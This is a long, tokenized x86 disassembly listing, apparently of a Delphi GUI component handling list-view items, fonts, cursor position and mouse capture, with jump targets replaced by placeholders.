mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_409078
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48026c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_422568
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
call sub_421054
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_421528
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_48120c
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_409078
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
mov ax [ ebx + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_422568
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
push 0x1
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
call sub_429058
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_47da98
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_481c98
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
sub_48026c
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4223e0
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_48091c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x98 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_447fd0
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_4171e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_47ceb8
call sub_47cce0
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_47ceb8
pop edx
call sub_47cd14
inc esi
dec edi
jne r-xdata
sub_4809b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_480a00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_480a59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x22c ]
call sub_47db78
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47d618
mov edx esi
mov eax ebx
call sub_47d6c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480a60
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_480a68
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
mov cl 0x2
jmp r-xdata
sub_480ab0
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov cl 0x2
jmp r-xdata
sub_480ae8
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_47d534
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x32c ]
call [ esi + 0x328 ]
sub_480b20
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x342 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_480b4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403e54#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_40461c
mov edx esi
mov eax ebx
call sub_47fa9c
mov esi eax
cmp [ ebx + 0x33a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480bc4
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_47d618
sub_480bcc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x224 ]
pop ebx
retn
sub_480be8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_4424ec
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_445f34
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_445ea0
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_480c66
add [ eax ] al
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_442560
xor eax eax
mov [ ebx + 0x270 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x26c ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_481368
mov esi eax
mov [ ebx + 0x26c ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
call sub_47da4c
push eax
mov eax ebx
call sub_448484
lea ecx [ esp + 0xc ]
pop edx
call sub_429218
test eax eax
je r-xdata
mov ebx [ ebx + 0x224 ]
mov edx eax
mov eax ebx
call sub_44ef04
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_47da68
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_449da8
sub_480d3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442580
mov eax [ ebx + 0x224 ]
call sub_449f90
xor eax eax
mov [ ebx + 0x270 ] eax
pop ebx
pop ebp
retn 0x4
sub_480d68
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447b88
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_4811a4
mov [ ebx + 0x270 ] eax
xor edx edx
mov eax ebx
call sub_4811c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_480e9c
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_480fa4
mov esi eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_4068dc
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax ebx
call sub_481300
mov esi eax
jmp r-xdata
mov eax esi
call sub_47da4c
push eax
mov eax [ ebx + 0x22c ]
call sub_47dbd4
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test esi esi
je r-xdata
inc edi
mov esi eax
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
xor ecx ecx
mov edx 0x1
call sub_47d760
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov edx 0x1
call sub_47d6f8
test al al
je r-xdata
sub_480e9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx ecx
mov eax ebx
mov ecx [ ebp + 0xc ]
call sub_481368
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4811a4
mov edi eax
cmp edi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
test edi edi
je r-xdata
cmp esi [ ebx + 0x270 ]
jne r-xdata
mov cl [ ebp + 0x8 ]
mov edx 0x1
mov eax esi
call sub_47d760
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_47d760
sub_480f24
push ebx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_448484
mov edx sub_47e5bc
xor ecx ecx
call sub_429388
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_480f54
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
mov dl [ eax + 0x229 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2ea ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_480f24
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_480fa4
push ebx
push esi
mov ebx eax
xor esi esi
mov al [ ebx + 0x215 ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_448484
call sub_429264
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov esi eax
sub_480fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x218 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x218 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_44fc00
xor ecx ecx
xor edx edx
mov eax ebx
call sub_47ed54
mov edx [ ebx + 0x27c ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x218 ]
call sub_41e274
mov eax [ ebx + 0x218 ]
call sub_44ef40
mov edx eax
xor ecx ecx
mov eax ebx
call sub_47ed54
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_48104c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x21c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x280 ]
call sub_44fc00
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_47ed54
mov edx [ ebx + 0x280 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x21c ]
call sub_41e274
mov eax [ ebx + 0x21c ]
call sub_44ef40
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_47ed54
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4810c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x220 ] esi
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_44fc00
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov eax ebx
call sub_47f340
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_47ed54
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_41e274
mov eax [ ebx + 0x220 ]
call sub_44ef40
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_47ed54
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
mov eax ebx
call sub_47f3c4
mov dl 0x1
mov eax ebx
call sub_47f3c4
mov eax ebx
call sub_47f2b4
jmp r-xdata
sub_4811a4
push ebx
mov ebx eax
mov al [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_48122c
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x270 ]
sub_4811c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_4811a4
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_47d760
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_47d760
sub_48122c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_481263 ]
or edi 0xffffffff
mov eax edi
call sub_47da4c
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_448484
mov ecx esi
mov edx edi
call sub_4290d0
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov [ ebp - 0x8 ] eax
sub_481300
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_448484
lea ecx [ esp + 0x8 ]
or edx 0xffffffff
call sub_4290f4
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x22c ]
call sub_47dc04
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_481368
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_4068dc
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_448484
mov edx esp
call sub_429140
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov esi eax
sub_4813cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_448484
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_42916c
pop esi
pop ebx
retn
sub_4813ec
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_48142c
inc edi
dec esi
jne r-xdata
sub_48142c
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_47ceb8
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_4048dc
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_416e68
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_4038bc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_47ceb8
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_448484
lea ecx [ esp + 0x5 ]
pop edx
call sub_429198
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_47ceb8
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_448484
lea ecx [ esp + 0x5 ]
pop edx
call sub_429198
jmp r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_448484
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_4291f4
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_47ceb8
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_448484
mov ecx [ edi + 0x24 ]
pop edx
call sub_4291f4
sub_481574
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
mov ax [ edi + 0x4 ]
call sub_459160
mov ebx eax
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x26c ] 0xffffffff
mov edx edi
mov eax esi
call sub_443404
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
cmp [ esi + 0x228 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_4418a8
lea eax [ esp + 0xc ]
call sub_4074a8
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4424ec
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x228 ] 0x0
je r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_40742c
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageA
jmp r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_40742c
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_442f30
mov [ esi + 0x230 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_481368
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_47d6f8
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_481368
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_442424
mov edx 0x3
mov eax ebp
call sub_47d6f8
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_442424
jmp r-xdata
sub_4816d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_48185c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_441768
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481863
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_48183f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_47cce0
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_416044
jmp r-xdata
